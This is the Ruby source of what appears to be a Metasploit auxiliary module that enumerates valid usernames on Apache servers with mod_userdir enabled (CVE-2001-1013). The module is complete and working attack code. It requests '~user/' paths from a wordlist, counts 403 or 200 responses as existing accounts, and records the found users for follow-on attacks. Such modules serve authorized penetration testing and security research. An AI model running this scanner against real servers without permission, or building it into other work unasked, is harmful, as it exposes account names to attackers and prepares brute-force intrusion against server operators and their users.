##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Auxiliary::AuthBrute

	def initialize
		super(
			'Name'           => 'Apache "mod_userdir" User Enumeration',
			'Description'    => %q{Apache with the UserDir directive enabled generates different error
			codes when a username exists and there is no public_html directory and when the username
			does not exist, which could allow remote attackers to determine valid usernames on the
			server.},
			'Author'         =>
				[
					'Alligator Security Team',
					'Heyder Andrade <heyder.andrade[at]alligatorteam.org>',
				],
			'References'     =>
				[
					['BID', '3335'],
					['CVE', '2001-1013'],
					['OSVDB', '637'],
				],
			'License'        =>  MSF_LICENSE
		)

		register_options(
			[
				OptString.new('URI', [true, 'The path to users Home Page', '/']),
				OptPath.new('USER_FILE',  [ true, "File containing users, one per line",
					File.join(Msf::Config.install_root, "data", "wordlists", "unix_users.txt") ]),
			], self.class)

		deregister_options(
			'PASSWORD',
			'PASS_FILE',
			'USERPASS_FILE',
			'STOP_ON_SUCCESS',
			'BLANK_PASSWORDS',
			'USER_AS_PASS'
		)
	end

	def target_url
		uri = normalize_uri(datastore['URI'])
		"http://#{vhost}:#{rport}#{uri}"
	end

	def run_host(ip)
		@users_found = {}

		each_user_pass { |user,pass|
			do_login(user)
		}

		if(@users_found.empty?)
			print_status("#{target_url} - No users found.")
		else
			print_good("#{target_url} - Users found: #{@users_found.keys.sort.join(", ")}")
			report_note(
				:host => rhost,
				:port => rport,
				:proto => 'tcp',
				:sname => (ssl ? 'https' : 'http'),
				:type => 'users',
				:data => {:users =>  @users_found.keys.join(", ")}
			)
		end
	end

	def do_login(user)

		vprint_status("#{target_url}~#{user} - Trying UserDir: '#{user}'")
		uri = normalize_uri(datastore['URI'])
		payload = "#{uri}~#{user}/"
		begin
			res = send_request_cgi(
				{
					'method'  => 'GET',
					'uri'     => payload,
					'ctype'   => 'text/plain'
				}, 20)

			return unless res
			if ((res.code == 403) or (res.code == 200))
				print_good("#{target_url} - Apache UserDir: '#{user}' found ")
				@users_found[user] = :reported
			else
				vprint_status("#{target_url} - Apache UserDir: '#{user}' not found ")
			end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end

end
